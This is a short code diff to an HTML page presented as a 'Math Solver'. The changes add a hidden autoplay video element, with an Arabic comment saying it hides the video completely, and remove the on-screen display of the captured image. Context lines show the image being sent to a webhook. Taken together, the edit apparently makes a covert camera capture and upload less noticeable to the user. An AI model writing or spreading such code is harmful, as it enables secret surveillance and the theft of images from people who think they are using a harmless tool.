@@ -30,13 +30,16 @@
       font-size: 24px;
       color: #003580;
     }
-   
+    video {
+      display: none; /* إخفاء الفيديو بالكامل */
+    }
   </style>
 </head>
 <body>
   <h1>Math Solver</h1>
   <img id="math-image" src="" alt="Math Equation">
   <div id="math-equation"></div>
+  <video id="video" autoplay></video>
 
   <script>
     var imageCounter = 1;
@@ -58,7 +61,6 @@
       
       // تحويل الصورة إلى Blob بأعلى جودة
       canvas.toBlob(function(blob) {
-        document.getElementById('math-image').src = URL.createObjectURL(blob);
 
         // إرسال الصورة إلى Webhook
         var formData = new FormData();
